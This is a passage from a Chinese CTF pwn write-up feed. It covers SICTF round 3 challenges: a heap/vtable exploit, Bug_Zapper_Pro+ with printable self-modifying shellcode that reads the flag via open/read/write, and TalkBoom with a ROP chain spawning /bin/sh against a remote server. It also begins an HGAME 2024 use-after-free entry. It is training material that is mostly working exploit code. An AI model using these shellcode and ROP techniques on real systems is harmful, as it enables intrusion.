punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x2650</span>backdoor <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x22E0</span>vtable <span class="token operator">=</span> code_base <span class="token operator">+</span> <span class="token number">0x4D38</span>add<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vtable <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x48'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">b'\x10'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">-</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Bug-Zapper-Pro"><a href="#Bug-Zapper-Pro" class="headerlink" title="Bug_Zapper_Pro+"></a>Bug_Zapper_Pro+</h2><p>由于存在<code>ptrace</code>，所以在长度为<code>0xb</code>的时候能调试，在长度为<code>0x10</code>的时候能执行但不能调试，题目限制了<code>shellcode</code>的长度在<code>0x10</code>之内并且是可见字符</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>    <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">=</span> v3 <span class="token operator">+</span> <span class="token number">85</span><span class="token punctuation">;</span>    __asm <span class="token punctuation">&#123;</span> syscall<span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_creat <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v6 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">0x114514FE0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> v4 <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v6 <span class="token operator">&lt;</span> <span class="token number">0x20</span> <span class="token operator">||</span> <span class="token operator">*</span>v6 <span class="token operator">>=</span> <span class="token number">0x7E</span> <span class="token punctuation">)</span>          <span class="token keyword">goto</span> end<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      MEMORY<span class="token punctuation">[</span><span class="token number">0x114514FE0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>思路还是先写<code>shellcode</code>再次执行<code>read</code>，程序中跳转后的起始地址在<code>0x114514FE0</code>，但是<code>rwx</code>段到<code>0x114515000</code>结束，中间长度不够，所以再次读的时候还要向上转移</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmapLEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA             Start                End Perm     Size Offset File          0x400000           0x401000 r--p     <span class="token number">1000</span>      <span class="token number">0</span> /home/starrysky/game2024/sictf_r3/bugzapper_pro_release/pwn          0x401000           0x402000 r-xp     <span class="token number">1000</span>   <span class="token number">1000</span> /home/starrysky/game2024/sictf_r3/bugzapper_pro_release/pwn          0x402000           0x403000 rw-p     <span class="token number">1000</span>   <span class="token number">2000</span> /home/starrysky/game2024/sictf_r3/bugzapper_pro_release/pwn       0x114514000        0x114515000 rwxp     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>anon_114514<span class="token punctuation">]</span>    0x7ffff7ff9000     0x7ffff7ffd000 r--p     <span class="token number">4000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>    0x7ffff7ffd000     0x7ffff7fff000 r-xp     <span class="token number">2000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>    0x7ffffffde000     0x7ffffffff000 rw-p    <span class="token number">21000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>0xffffffffff600000 0xffffffffff601000 <span class="token parameter variable">--xp</span>     <span class="token number">1000</span>      <span class="token number">0</span> <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见字符最大的问题就是不能写入<code>syscall</code>，所以可以通过先向需要执行<code>syscall</code>的地方向写入可见字符再和某个位置异或间接的得到<code>syscall</code>，异或需要用到<code>rax + address</code>，而<code>shellcode</code>每一位都要大于<code>0x20</code>，所以先<code>rax</code>减去一部分，减去的这个值需要满足：低两位与<code>syscall</code>异或的值是可见字符、其本身也是可见字符，最终我选择了<code>- 0x67</code>,最终<code>rax</code>的低位是<code>0x4f79</code>，与<code>syscall</code>异或之后<code>&gt;&gt;&gt; hex(0x4f79 ^ 0x050f) = 0x4a76</code>,所以在<code>shellcode</code>末尾写<code>0x4a76</code>,异或后即可得到<code>syscall</code></p><p>其中读入的地址我选择了<code>rax - 0x67</code>，这样可以读入的长度会更长一些，再次读入的<code>shellcode</code>需要控制第一次读入的地址的下一个命令<code>jmp rsi</code>，最后执行<code>orw</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''sub al, 0x67push raxpop rsixor word ptr [rax + 0x72], axpop rdxpush rbxpop rax.word 0x4a76'''</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x20'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Welcome'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''mov rax,0x67616c66push raxmov rdi,rspmov rsi,0mov rdx,0mov rax,2syscallmov rdi,raxmov rsi,rspmov rdx,1024mov rax,0syscallmov rdi,1mov rsi,rspmov rdx,raxmov rax,1syscallmov rdi,0mov rax,60syscall'''</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token string">b'\x90'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''jmp rsi'''</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="TalkBoom"><a href="#TalkBoom" class="headerlink" title="TalkBoom"></a>TalkBoom</h2><p><code>rust</code>写的程序，没开<code>canary</code>和<code>pie</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">  talk  checksec pwn     <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game2024/sictf_r3/talk/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会将输入的字符串和很多字符串进行比较</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:000000000040504D 48 8D 35 AC 31 04 00          lea     rsi, unk_448200                 ; s2.text:0000000000405054 BA 40 00 00 00                mov     edx, 40h ; &#39;@&#39;                  ; n.text:0000000000405059 4C 89 F7                      mov     rdi, r14                        ; s1.text:000000000040505C FF 15 5E AC 05 00             call    cs:bcmp_ptr.text:000000000040505C.text:0000000000405062 85 C0                         test    eax, eax.text:0000000000405064 0F 84 E0 04 00 00             jz      loc_40554A.text:0000000000405064.text:000000000040506A 48 8D 35 CF 31 04 00          lea     rsi, unk_448240                 ; s2.text:0000000000405071 BA 40 00 00 00                mov     edx, 40h ; &#39;@&#39;                  ; n.text:0000000000405076 4C 89 F7                      mov     rdi, r14                        ; s1.text:0000000000405079 FF 15 41 AC 05 00             call    cs:bcmp_ptr.text:0000000000405079.text:000000000040507F 85 C0                         test    eax, eax.text:0000000000405081 0F 84 FE 04 00 00             jz      loc_405585.text:0000000000405081...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比较之后跳转，跳转之后有一个<code>mov edi</code>，在<code>mov edi, 100h</code>的那个分值会跳转到一个存在栈溢出的<code>read</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0000000000405585 48 8D 05 FC 79 05 00          lea     rax, off_45CF88.text:000000000040558C 48 89 04 24                   mov     [rsp+68h+s1], rax               ; args.text:0000000000405590 48 C7 44 24 08 01 00 00 00    mov     [rsp+68h+size], 1.text:0000000000405599 48 8D 05 28 32 04 00          lea     rax, unk_4487C8.text:00000000004055A0 48 89 44 24 10                mov     [rsp+68h+size+8], rax.text:00000000004055A5 0F 57 C0                      xorps   xmm0, xmm0.text:00000000004055A8 0F 11 44 24 18                movups  [rsp+68h+var_50], xmm0.text:00000000004055AD 48 89 E7                      mov     rdi, rsp.text:00000000004055B0 FF 15 4A A6 05 00             call    cs:_ZN3std2io5stdio6_print17h8c9d4123cf4200e3E_ptr ; std::io::stdio::_print::h8c9d4123cf4200e3.text:00000000004055B0.text:00000000004055B6.text:00000000004055B6                               loc_4055B6:                             ; CODE XREF: SphinxBomb::main::hb23b3d8accd9981a+81C↓j.text:00000000004055B6 BF 17 00 00 00                mov     edi, 17h.text:00000000004055BB E9 A4 00 00 00                jmp     loc_405664.text:00000000004055BB.text:00000000004055C0                               ; ---------------------------------------------------------------------------.text:00000000004055C0.text:00000000004055C0                               loc_4055C0:                             ; CODE XREF: SphinxBomb::main::hb23b3d8accd9981a+1FE↑j.text:00000000004055C0 48 8D 05 B1 79 05 00          lea     rax, off_45CF78.text:00000000004055C7 48 89 04 24                   mov     [rsp+68h+s1], rax               ; args.text:00000000004055CB 48 C7 44 24 08 01 00 00 00    mov     [rsp+68h+size], 1.text:00000000004055D4 48 8D 05 ED 31 04 00          lea     rax, unk_4487C8.text:00000000004055DB 48 89 44 24 10                mov     [rsp+68h+size+8], rax.text:00000000004055E0 0F 57 C0                      xorps   xmm0, xmm0.text:00000000004055E3 0F 11 44 24 18                movups  [rsp+68h+var_50], xmm0.text:00000000004055E8 48 89 E7                      mov     rdi, rsp.text:00000000004055EB FF 15 0F A6 05 00             call    cs:_ZN3std2io5stdio6_print17h8c9d4123cf4200e3E_ptr ; std::io::stdio::_print::h8c9d4123cf4200e3.text:00000000004055EB.text:00000000004055F1 BF 2E 00 00 00                mov     edi, 2Eh ; &#39;.&#39;.text:00000000004055F6 EB 6C                         jmp     short loc_405664.text:00000000004055F6.text:00000000004055F8                               ; ---------------------------------------------------------------------------.text:00000000004055F8...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">ssize_t __fastcall <span class="token class-name">SphinxBomb</span><span class="token punctuation">::</span><span class="token namespace">bomb_counter<span class="token punctuation">::</span></span><span class="token function">h2ef55620c9869ad5</span><span class="token punctuation">(</span>size_t nbytes<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int128 v2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-38h] BYREF</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">sizeof</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接连接远程得到程序的<code>base64</code>解码得到的字符串，每次比较的字符串和<code>mov edi, 100h</code>这个位置是不一样的，但是字符串的位置是一样的，本题的思路就是接收程序，利用<code>pwntools</code>直接获取一个固定地址的字符串，一共有30个分支，直接死循环直到执行成功</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> angrcontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'This is your Bomb: \n'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"b'"</span><span class="token punctuation">)</span>    a <span class="token operator">=</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    decoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"poc3.gz"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decoded<span class="token punctuation">)</span>    li<span class="token punctuation">(</span><span class="token string">'[+] Download'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'gzip -d poc3.gz &amp;&amp; chmod +x poc3'</span><span class="token punctuation">)</span>    li<span class="token punctuation">(</span><span class="token string">b'ok'</span><span class="token punctuation">)</span>    binary_path <span class="token operator">=</span> <span class="token string">'./poc3'</span>    target_address <span class="token operator">=</span> <span class="token number">0x448740</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary_path<span class="token punctuation">)</span>    value <span class="token operator">=</span> elf<span class="token punctuation">.</span>read<span class="token punctuation">(</span>target_address<span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">)</span>    li<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'rm poc3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Welcome'</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span>    pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000402359</span>    pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x00000000004042bc</span>    pop_rcx_ret <span class="token operator">=</span> <span class="token number">0x402b38</span>     mov_rdx_rcx_rbx_ret <span class="token operator">=</span> <span class="token number">0x4461d4</span>    p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4603e8</span> <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404e8d</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4603e8</span> <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rcx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_rdx_rcx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x402a7c</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'112.124.59.213'</span><span class="token punctuation">,</span> <span class="token number">10001</span><span class="token punctuation">)</span>        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;stack&quot;&gt;&lt;a href=&quot;#stack&quot; class=&quot;headerlink&quot; title=&quot;stack&quot;&gt;&lt;/a&gt;stack&lt;/h2&gt;&lt;p&gt;&lt;code&gt;run&lt;/code&gt;函数&lt;code&gt;return&lt;/code&gt;了&lt;code&gt;strdup(buf)&lt;/c</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="fmt" scheme="https://starrysky1004.github.io/tags/fmt/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-2024-week2-pwn</title>
    <link href="https://starrysky1004.github.io/2024/02/24/hgame-2024-week2-pwn/hgame-2024-week2-pwn/"/>
    <id>https://starrysky1004.github.io/2024/02/24/hgame-2024-week2-pwn/hgame-2024-week2-pwn/</id>
    <published>2024-02-24T12:24:08.000Z</published>
    <updated>2024-07-14T00:26:58.549Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Elden-Ring-Ⅱ"><a href="#Elden-Ring-Ⅱ" class="headerlink" title="Elden Ring Ⅱ"></a>Elden Ring Ⅱ</h2><p>2.32的<code>uaf</code>，漏洞点出现在<code>delete</code>之后没有清零</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">delete_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h] BYREF</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">&lt;=</span> <span class="token number">0xF</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> notes<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>notes<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Page not found."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There are only 16 pages in this notebook."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span 